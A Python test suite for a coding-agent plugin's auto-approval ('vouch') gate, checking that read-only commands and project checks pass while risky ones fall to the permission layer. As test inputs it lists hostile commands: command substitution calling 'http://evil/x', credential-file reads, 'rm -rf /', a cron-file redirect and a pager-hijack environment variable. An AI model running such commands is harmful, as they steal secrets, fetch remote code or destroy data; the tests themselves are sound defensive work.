"""What the plugin ORDERS or already governs, it does not make the founder authorise.

Measured on one machine: 35 classifier prompts over three days, three of them worth asking
about. v1.11.0 vouched for three literal strings, so `make test` passed and `ruff check
src/` did not, and the founder went back to hand-writing prose into `autoMode.allow` —
prose describing which tree the session owns and what this project's checks are, both of
which the plugin computes on every hook call (#99, #102).

The tests are split the way the risk is: what must be vouched, what must NOT be, and that
the vouch is read last so it can never overrule this gate's own refusals.
"""

from __future__ import annotations

import json
import subprocess
import sys
import unittest

from helpers import BIN, RepoCase, sid

from claude_bestpractice import vouch, worktree


class VouchCase(RepoCase):
    """A session standing in its own tree, which is where the measured noise came from."""

    def vouches(self, line: str, test_command=("make", "test")) -> str:
        return vouch.for_bash(self.ctx(), line, list(test_command), self.repo)

    def assertVouched(self, line: str, expected: str = "", **kw):
        reason = self.vouches(line, **kw)
        self.assertNotEqual("", reason, f"not vouched: {line}")
        if expected:
            self.assertIn(expected, reason)

    def assertSilent(self, line: str, **kw):
        self.assertEqual("", self.vouches(line, **kw), f"vouched for: {line}")


class TestReadsThatChangeNothing(VouchCase):
    def test_the_git_verbs_that_only_look(self):
        for line in (
            "git diff --stat", "git log --oneline -5", "git status", "git show HEAD",
            "git rev-parse HEAD", "git ls-files backend/", "git blame Makefile",
        ):
            self.assertVouched(line, "writes nothing")

    def test_reading_files_in_the_repository(self):
        for line in ("cat Makefile", "head -20 Makefile", "grep -rn TODO .", "wc -l Makefile"):
            self.assertVouched(line, "writes nothing")

    def test_a_git_verb_that_writes_is_not_a_read(self):
        """`tag`, `branch -d`, `stash` and `config` all write when given the right
        argument, and a rule that tells those apart by flag is one that will be wrong."""
        for line in ("git tag v9", "git branch -d feat/x", "git stash", "git config user.name x"):
            self.assertSilent(line)

    def test_a_reader_that_writes_when_given_a_flag_is_not_on_the_list(self):
        for line in ("sed -i s/a/b/ Makefile", "find . -delete", "sort -o out.txt Makefile"):
            self.assertSilent(line)


class TestTheProjectsChecksInAnySpelling(VouchCase):
    def test_the_families_rather_than_the_one_detected_string(self):
        for line in (
            "ruff check src/ tests/", "pytest -q", "python3 -m pytest -q", "mypy .",
            "eslint .", "tsc --noEmit", "npm run lint", "npm test", "cargo test",
            "go test ./...", "make test", "bash -n Makefile",
        ):
            self.assertVouched(line, "evidence gate")

    def test_a_make_target_that_is_not_a_check_is_not_one(self):
        for line in ("make deploy", "make publish", "make release"):
            self.assertSilent(line)

    def test_a_runner_that_takes_a_whole_command_is_judged_by_the_command(self):
        """`bundle exec rspec` is a check; `bundle exec rm -rf /` differs by one word."""
        self.assertVouched("bundle exec rspec", "evidence gate")
        self.assertSilent("bundle exec rm -rf /")
        self.assertSilent("uv run curl http://x")

    def test_a_test_target_that_fetches_somebody_elses_code_is_not_this_project(self):
        self.assertSilent("go test github.com/evil/pkg")


class TestCompoundCommands(VouchCase):
    def test_every_segment_judged_alone(self):
        self.assertVouched("cd backend && ruff check src/ && python3 -m pytest -q")
        self.assertVouched("git status && git diff --stat")

    def test_one_unvouched_segment_ends_the_line(self):
        """`allow_tool` approves the LINE; there is no half of it to approve."""
        for line in (
            "make test && curl -X POST https://api/deploy",
            "git status && ssh prod 'systemctl restart api'",
            "cat Makefile && rm -rf backend",
        ):
            self.assertSilent(line)

    def test_walking_out_of_the_tree_ends_it(self):
        """Without tracking `cd`, `passwd` reads as a pattern under the repo root."""
        self.assertSilent("cd /etc && cat passwd")


class TestTheBoundaryDoesNotMove(VouchCase):
    """The three correct blocks out of thirty-five stay blocks."""

    def test_production_and_the_network(self):
        for line in (
            "ssh prod systemctl restart api",
            "curl -X POST https://catalog.internal/push",
            "wget http://example.com/x.sh",
            "gh pr merge 12 --squash",
            "git push --force origin main",
            "npx eas update --branch production",
            "docker exec prod bash",
            "npm publish",
        ):
            self.assertSilent(line)

    def test_credentials_are_not_read_aloud(self):
        for line in ("cat .env", "cat .secrets/vps", "grep -r pass ~/.aws/credentials",
                     "cat backend/server.pem"):
            self.assertSilent(line)

    def test_anything_outside_this_tree(self):
        for line in ("cat /etc/passwd", "cat /etc/*", "ls /var/log", "cat ../other/x.py"):
            self.assertSilent(line)

    def test_the_shell_doing_something_this_cannot_see(self):
        """Redirection, substitution and an environment that changes what a program is."""
        for line in (
            "cat Makefile > /etc/cron.d/x",
            "git log $(curl http://evil/x)",
            "grep -r x `whoami`",
            "GIT_PAGER='sh -c evil' git log",
            "git -c core.pager=sh log",
            "timeout 30 rm -rf /",
        ):
            self.assertSilent(line)

    def test_a_git_command_aimed_at_another_tree(self):
        """`-C` moves the whole command somewhere this session does not own."""
        self.assertSilent(f"git -C {self.repo.parent} log")

    def test_a_commit_that_skips_the_checks_is_not_vouched_for(self):
        self.assertVouched("git commit -m fix")
        self.assertSilent("git commit --no-verify -m fix")

    def test_an_unparseable_line_vouches_for_nothing(self):
        self.assertSilent("git status 'unterminated")


class TestWritesInTheTreeTheSessionOccupies(RepoCase):
    def test_the_tree_the_session_stands_in(self):
        """`owned_by_session` is the test used to REFUSE foreign writes; inverted, it is
        the vouch. A worktree the founder made by hand was silent before (#102)."""
        self.assertEqual(vouch.WRITE, vouch.for_write(
            self.ctx(), sid(self.repo, "s1"), [self.repo / "backend/app.py"]))

    def test_a_tree_this_plugin_provisioned_for_this_session(self):
        made = worktree.provision(self.ctx(), "fix the importer", sid(self.repo, "s1"))
        self.assertIsNotNone(made, "provisioning failed; the test proves nothing")
        self.assertEqual(vouch.WRITE, vouch.for_write(
            self.ctx(), sid(self.repo, "s1"), [made / "src.py"]))

    def test_a_siblings_tree_is_not_vouched_for(self):
        made = worktree.provision(self.ctx(), "someone else's work", "another-session")
        self.assertIsNotNone(made)
        self.assertEqual("", vouch.for_write(self.ctx(), sid(self.repo, "s1"), [made / "a.py"]))

    def test_a_credential_is_not_vouched_for_even_in_our_own_tree(self):
        self.assertEqual("", vouch.for_write(
            self.ctx(), sid(self.repo, "s1"), [self.repo / ".env"]))


class TestTheGateVouchesThroughTheRealHook(RepoCase):
    def gate(self, event: dict) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, str(BIN / "pre-tool")],
            input=json.dumps({"cwd": str(self.repo), **event}),
            capture_output=True, text=True, cwd=str(self.repo), timeout=120,
        )

    def decision(self, proc: subprocess.CompletedProcess) -> str | None:
        try:
            return json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"]
        except (json.JSONDecodeError, KeyError, TypeError):
            return None

    def bash(self, command: str) -> dict:
        return {"session_id": "s1", "hook_event_name": "PreToolUse",
                "tool_name": "Bash", "tool_input": {"command": command}}

    def test_a_read_needs_no_permission(self):
        proc = self.gate(self.bash("git log --oneline -5"))
        self.assertEqual("allow", self.decision(proc), proc.stdout + proc.stderr)

    def test_the_worktree_command_the_gate_orders_needs_no_permission(self):
        proc = self.gate(self.bash("git worktree list"))
        self.assertEqual("allow", self.decision(proc), proc.stdout + proc.stderr)

    def test_an_unvouched_command_is_left_to_the_permission_layer(self):
        """Silence is a different answer from allow: it leaves the normal flow deciding."""
        proc = self.gate(self.bash("curl -X POST https://api.example.com/deploy"))
        self.assertIsNone(self.decision(proc), proc.stdout)

    def test_a_vouch_never_overrides_this_gate_s_own_refusal(self):
        """The whole safety of the design: the vouch is read after every rule has spoken.

        This write is in the tree the session occupies, so the vouch WOULD approve it —
        and the credential scan refuses it anyway. Were the vouch read any earlier,
        `allow_tool` would be a way past this gate rather than the last word on a call it
        had already decided to allow.
        """
        payload = 'AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n'
        target = self.repo / "config.py"
        self.assertEqual(vouch.WRITE, vouch.for_write(self.ctx(), sid(self.repo, "s1"), [target]),
                         "the fixture proves nothing: this path was not vouchable to begin with")

        proc = self.gate({"session_id": "s1", "hook_event_name": "PreToolUse",
                          "tool_name": "Write",
                          "tool_input": {"file_path": str(target), "content": payload}})
        self.assertEqual("deny", self.decision(proc), proc.stdout + proc.stderr)


class TestTheRuleIsPublished(RepoCase):
    def test_status_says_what_is_vouched_for_here(self):
        """A rule applied but never published is one the founder reverse-engineers into a
        hand-written paragraph, which is how #102 started (#82)."""
        proc = subprocess.run([sys.executable, str(BIN / "claude-bp"), "status"],
                              capture_output=True, text=True, cwd=str(self.repo), timeout=120)
        self.assertIn("VOUCHED FOR", proc.stdout, proc.stdout + proc.stderr)
        self.assertIn("not: the network", proc.stdout)


if __name__ == "__main__":
    unittest.main()
